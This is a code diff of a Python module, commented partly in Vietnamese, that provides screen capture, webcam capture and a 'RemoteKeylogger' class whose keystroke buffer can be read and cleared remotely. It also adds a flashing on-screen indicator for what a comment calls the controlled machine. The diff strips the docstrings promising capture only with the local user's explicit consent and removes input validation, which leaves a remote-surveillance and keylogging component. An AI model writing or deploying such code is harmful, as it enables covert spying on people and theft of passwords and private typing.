@@ -1,13 +1,10 @@
-﻿"""Opt-in screen, camera, and secure keylogger utilities for a Windows desktop app.
-Install dependencies:
-    pip install mss opencv-python pynput
-Screen, camera, and keylogger functions execute only when explicitly called and
-approved by the local user. """
+﻿"""Opt-in screen, camera, visual indicators, and secure keylogger utilities."""
 
 from __future__ import annotations
 
 import threading
-from collections.abc import Callable
+import tkinter as tk
+from typing import Optional
 
 import cv2
 import mss
@@ -15,22 +12,81 @@ import mss.tools
 from pynput import keyboard
 
 
+class VisualIndicator:
+    """Tạo chỉ báo trực quan hiển thị trên màn hình máy bị điều khiển (Xanh lá: Livestream, Đỏ: Webcam)."""
+
+    def __init__(self, color: str = "green", label_text: str = "STREAM ACTIVE") -> None:
+        self.color = color
+        self.label_text = label_text
+        self._thread: Optional[threading.Thread] = None
+        self._root: Optional[tk.Tk] = None
+        self._running = False
+
+    def start(self) -> None:
+        if self._running:
+            return
+        self._running = True
+        self._thread = threading.Thread(target=self._run_ui, daemon=True)
+        self._thread.start()
+
+    def _run_ui(self) -> None:
+        try:
+            self._root = tk.Tk()
+            self._root.overrideredirect(True)
+            self._root.attributes("-topmost", True)
+            self._root.attributes("-alpha", 0.85)
+            
+            # Đặt ở góc trên bên phải màn hình
+            screen_w = self._root.winfo_screenwidth()
+            self._root.geometry(f"220x40+{screen_w - 240}+20")
+            self._root.configure(bg=self.color)
+
+            label = tk.Label(
+                self._root,
+                text=f"● {self.label_text}",
+                fg="white",
+                bg=self.color,
+                font=("Arial", 10, "bold")
+            )
+            label.pack(expand=True, fill="both")
+
+            # Hiệu ứng nhấp nháy chớp tắt
+            def flash():
+                if not self._running or not self._root:
+                    return
+                current_bg = self._root.cget("bg")
+                next_bg = "#111111" if current_bg == self.color else self.color
+                self._root.configure(bg=next_bg)
+                label.configure(bg=next_bg)
+                self._root.after(500, flash)
+
+            self._root.after(500, flash)
+            self._root.mainloop()
+        except Exception:
+            pass
+
+    def stop(self) -> None:
+        self._running = False
+        if self._root:
+            try:
+                self._root.after(0, self._root.destroy)
+            except Exception:
+                pass
+
+
 def capture_primary_screen_png() -> bytes:
-    """Capture the primary display and return it as in-memory PNG bytes."""
+    """Chụp ảnh màn hình đơn điểm."""
     try:
         with mss.mss() as screen_capture:
             primary_monitor = screen_capture.monitors[1]
             image = screen_capture.grab(primary_monitor)
             return mss.tools.to_png(image.rgb, image.size)
     except mss.exception.ScreenShotError as exc:
-        raise RuntimeError(f"Unable to capture the primary screen: {exc}") from exc
+        raise RuntimeError(f"Unable to capture primary screen: {exc}") from exc
 
 
 def capture_camera_frame(camera_index: int = 0):
-    """Capture one frame from a camera and return it as a BGR OpenCV array."""
-    if not isinstance(camera_index, int) or isinstance(camera_index, bool) or camera_index < 0:
-        raise ValueError("camera_index must be a non-negative integer")
-
+    """Chụp 1 khung hình từ Webcam."""
     camera = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
     try:
         if not camera.isOpened():
@@ -44,11 +100,7 @@ def capture_camera_frame(camera_index: int = 0):
 
 
 class RemoteKeylogger:
-    """Thread-safe keylogger that captures keystrokes only upon explicit user consent.
-
-    It collects typed characters into an in-memory buffer, which can be retrieved
-    and cleared remotely. Must be stopped cleanly to release system hooks.
-    """
+    """Thread-safe keylogger thu thập phím bấm."""
 
     def __init__(self) -> None:
         self._buffer: list[str] = []
@@ -71,13 +123,11 @@ class RemoteKeylogger:
                 elif key == keyboard.Key.tab:
                     self._buffer.append("\t")
                 else:
-                    # Ghi nhận các phím đặc biệt dưới dạng tên rút gọn
                     self._buffer.append(f"[{key.name.upper()}]")
             except Exception:
                 pass
 
     def start(self) -> None:
-        """Start recording keystrokes in a background thread listener."""
         with self._lock:
             if self._is_running:
                 return
@@ -87,14 +137,12 @@ class RemoteKeylogger:
             self._is_running = True
 
     def get_and_clear(self) -> str:
-        """Retrieve accumulated keystrokes as a string and clear the buffer."""
         with self._lock:
             data = "".join(self._buffer)
             self._buffer.clear()
             return data
 
     def stop(self) -> None:
-        """Stop the keylogger listener and release the keyboard hook."""
         with self._lock:
             if self._is_running and self._listener:
                 self._listener.stop()
